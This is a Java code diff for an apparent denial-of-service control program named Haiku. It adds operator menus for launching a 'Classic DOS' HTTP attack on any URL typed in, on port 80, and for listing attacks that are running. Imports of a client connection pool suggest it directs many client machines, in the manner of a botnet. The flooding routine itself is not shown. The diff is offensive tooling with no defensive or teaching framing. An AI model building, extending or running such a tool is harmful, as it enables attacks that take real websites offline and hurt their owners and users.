@@ -8,6 +8,7 @@ import java.net.URL;
 import java.net.UnknownHostException;
 import java.util.Scanner;
 
+import haiku.client.vectors.instances.ClassicDOS;
 import haiku.server.classes.EventLog;
 import haiku.server.pool.ClientConnectionManager;
 
@@ -55,19 +56,48 @@ public class HaikuMain {
 
 		switch (opt) {
 		case 1:
-
+			ConsoleUtils.clearConsole();
+			attackTypes();
 			break;
 		case 2:
 			ConsoleUtils.clearConsole();
 			poolMenu();
 			break;
 		case 3:
-
+			ConsoleUtils.clearConsole();
+			manager.getOngoingAttacks().printRunningAttacks();
+			mainMenu();
 			break;
 		case 4:
 			ConsoleUtils.clearConsole();
 			EventLog.getInstance().printLogs();
 			mainMenu();
+			break;
+		}
+	}
+
+	private void attackTypes() {
+		showBanner();
+		int opt = ConsoleUtils.buildMenu("HTTP Attacks", "Back");
+		switch (opt) {
+		case 1:
+			ConsoleUtils.clearConsole();
+			httpAttacks();
+			break;
+		}
+	}
+
+	private void httpAttacks() {
+		showBanner();
+		int opt = ConsoleUtils.buildMenu("Classic DOS", "Back");
+		switch (opt) {
+		case 1:
+			ConsoleUtils.clearConsole();
+			System.out.println("URL: ");
+			String url = ConsoleUtils.getScanner().next();
+
+			this.manager.getOngoingAttacks().startNewAttack(ClassicDOS.class, url, 80);
+			System.out.println("Started Classic DOS attack");
 			break;
 		}
 	}
@@ -150,6 +180,7 @@ public class HaikuMain {
 		System.out.println("	    █     █  ▐   █  █▄ ▄█ ");
 		System.out.println("	   ▀     █      ▀    ▀▀▀  ");
 		System.out.println("	        ▀                 ");
-		System.out.println("	No will be there to help you...");
+		System.out.println("   No will be there to help you...");
+		System.out.println("");
 	}
 }
